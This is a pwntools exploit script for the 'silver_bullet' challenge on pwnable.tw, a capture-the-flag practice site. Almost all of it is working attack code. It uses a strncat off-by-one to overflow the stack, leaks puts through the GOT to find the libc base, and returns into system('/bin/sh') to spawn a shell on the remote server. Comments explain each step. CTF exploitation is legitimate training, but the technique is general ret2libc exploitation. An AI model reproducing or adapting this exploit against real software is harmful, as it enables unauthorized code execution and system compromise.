from pwn import *
debug=0
if debug:
	s = process('./silver_bullet')
	raw_input('debug')
	puts_offset = 0x5fca0
	system_offset = 0x3ada0
	binsh_offset = 0x15ba0b
else:
	s = remote('chall.pwnable.tw', 10103)
	e = ELF('./libc_32.so.6')
	puts_offset = e.symbols['puts']
	system_offset = e.symbols['system']
	binsh_offset = e.search('/bin/sh').next()
	
def create(data):
	s.sendlineafter('Your choice :','1')
	s.sendlineafter('Give me your description of bullet :',data)
def power(data):
	s.sendlineafter('Your choice :','2')
	s.sendlineafter('Give me your another description of bullet :',data)
def beat():
	s.sendlineafter('Your choice :','3')
	
main = 0x8048954 
puts_plt = 0x80484a8 
puts_got = 0x804afdc 

create('a'*44)
# one byte off because the strncat auto fill 0 at the end of the string, it overwrite the old power = 0
power('c'*6)
# new power = 0 + 6 = 6, we can still add 48-6=42 bytes, it overflow the ebp+4
# leak libc
power('f'*7 + p32(puts_plt) + p32(main)+p32(puts_got))
# beat the wolf to exit main and ret to puts and leak puts address
beat()
beat()

s.recvuntil('Oh ! You win !!\n')
puts = u32(s.recv(4))
libc_base = puts-puts_offset
system_libc = libc_base+system_offset
binsh_libc = libc_base+binsh_offset

log.info('puts_got: 0x%x'%puts)
log.info('libc_base: 0x%x'%libc_base)
log.info('system_libc: 0x%x'%system_libc)
log.info('binsh_libc: 0x%x'%binsh_libc)

# it back to main 
create('a'*44)
power('c'*6)
#overwrite the ebp+4 = system
power('f'*7 + p32(system_libc) + p32(main)+p32(binsh_libc))
beat()
beat()

s.interactive()
s.close()